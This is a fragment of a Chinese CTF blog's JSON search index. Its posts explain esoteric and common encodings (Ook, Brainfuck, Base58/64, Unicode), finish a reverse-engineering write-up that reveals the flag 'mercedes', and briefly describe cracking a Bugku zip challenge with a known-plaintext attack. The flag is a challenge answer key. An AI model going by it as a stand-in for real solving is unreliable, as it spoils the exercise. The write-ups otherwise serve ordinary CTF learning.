则首先将src的内容通过memcpy函数赋值给dest。则此时 dest 的内容就为 mercedes1if ( !strcmp(argv[1], (&amp;dict)[i]) &amp;&amp; !strcmp(&amp;dest, (&amp;dict)[i]) )根据这个逻辑, 如果输入(即angv[1])与 dict的其中一个相等,并且dest的内容与dict中的那一个相等,则提示 Good password,也就是我们的输入就是正确的flag。dict的内容… 根据上面的for循环,应该有999个…在dict找到了 dest的内容,更加确定答案就是’mercedes’所以最终答案就为:1mercedes","categories":[{"name":"逆向","slug":"逆向","permalink":"http://liul14n.top/categories/逆向/"}],"tags":[]},{"title":"令人蛋疼的编码(持续更新)","slug":"令人蛋疼的编码-持续更新","date":"2019-05-09T14:16:01.000Z","updated":"2020-03-23T15:47:56.839Z","comments":true,"path":"2019/05/09/令人蛋疼的编码-持续更新/","link":"","permalink":"http://liul14n.top/2019/05/09/令人蛋疼的编码-持续更新/","excerpt":"","text":"[一个不错的关于编码的博客](https://hackfun.org/2017/02/22/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86/)Ook编码 vs BrainfucBrainfuck/Ook:Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainfuck或brainfuck，甚至被简称为BF。OoK！是一种为红毛猩猩设计的编程语言。OoK！与众所周知的深奥语言BrainF uck基本上是同构的 ，但语法元素更少。形式112345678910111213141516171819202122232425262728293031323334353637383940414243Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook.Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.形式21....................!?!!.?....................?.?!.?....!.............!.?.......!?!!.?!!!!!!?.?!.?!!!!!.............!.?.........!?!!.?........?.?!.?........!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!.!!!!!!!!!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?..........!.?.........!?!!.?........?.?!.?..!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!.........!...!...!...!.!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?......!.......!...................!.!!!!!!!!!...........!.?.......!?!!.?......?.?!.?............!.?.通过观察可以看出来, 形式2是形式1去掉Ook和空格以后的形式。BrainFuck形式1++++++++[&gt;++++[&gt;++&gt;+++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;+&gt;+&gt;-&gt;&gt;+[&lt;]&lt;-]&gt;&gt;.&gt;---.+++++++..+++.&gt;&gt;.&lt;-.&lt;.+++.------.--------.&gt;&gt;+.&gt;++.观察可以看出, 该编码的形式由+- [] &gt;&lt; .组成Ook 和 BrainFuck都可以通过下面这个网站在线解码:1https://tool.bugku.com/brainfuck/Base58 vs Base64Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址,相比Base64，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”/“符号.UnicodeUnicode又称（统一码、万国码、单一码）世界上存在着多种编码方式，同一个二进制数字可以被解释成不同的符号。因此，要想打开一个文本文件，就必须知道它的编码方式，否则用错误的编码方式解读，就会出现乱码。为什么电子邮件常常出现乱码？就是因为发信人和收信人使用的编码方式不一样。可以想象，如果有一种编码，将世界上所有的符号都纳入其中。每一个符号都给予一个独一无二的编码，那么乱码问题就会消失。这就是 Unicode，就像它的名字都表示的，这是一种所有符号的编码。","categories":[{"name":"密码学","slug":"密码学","permalink":"http://liul14n.top/categories/密码学/"}],"tags":[]},{"title":"Bugku-神秘的文件","slug":"Bugku-神秘的文件","date":"2019-05-09T12:21:29.000Z","updated":"2019-08-08T07:59:04.523Z","comments":true,"path":"2019/05/09/Bugku-神秘的文件/","link":"","permalink":"http://liul14n.top/2019/05/09/Bugku-神秘的文件/","excerpt":"","text":"这道题做了有一段时间了,今天拿出来复现了一下, 发现这个题可以用明文攻击来解。当时直接暴力破解的…但是 今天明文攻击出了点小问题,特地记录一下。起初用的2345压缩 对 logo.png进行压缩的,但是这样总提示我一些错误…在网上搜了一番明文攻击的知识以后, 换了winrar压缩(压缩成zip格式)以后明文攻击就可以正常进行了。解出来密码以后就剩doc隐写了…没啥好说的了。","categories":[{"name":"杂项","slug":"杂项","permalink":"http://liul14n.top/categories/杂项/"}],"tags":[]},{"title":"HelloWorld","slug":"HelloWorld","date":"2019-04-25T13:50:12.000Z","updated":"2019-08-08T07:37:44.747Z","comments":true,"path":"2019/04/25/HelloWorld/","link":"","permalink":"http://liul14n.top/2019/04/25/HelloWorld/","excerpt":"","text":"Hello,world!这是我的第一篇博客。打算在博客里面更一些文章,比如学习记录、CTF的WP之类的。之前好些CTF题目都过去了, 没写WP…今后做了的题目,如果值得写WP, 那我会写在博客里面。","categories":[],"tags":[]}],"categories":[{"name":"随手小记","slug":"随手小记","permalink":"http://liul14n.top/categories/随手小记/"},{"name":"开发","slug":"开发","permalink":"http://liul14n.top/categories/开发/"},{"name":"逆向","slug":"逆向","permalink":"http://liul14n.top/categories/逆向/"},{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://liul14n.top/categories/CTF/"},{"name":"密码学","slug":"密码学","permalink":"http://liul14n.top/categories/密码学/"},{"name":"杂项","slug":"杂项","permalink":"http://liul14n.top/categories/杂项/"},{"name":"安卓逆向","slug":"安卓逆向","permalink":"http://liul14n.top/categories/安卓逆向/"}],"tags":[]}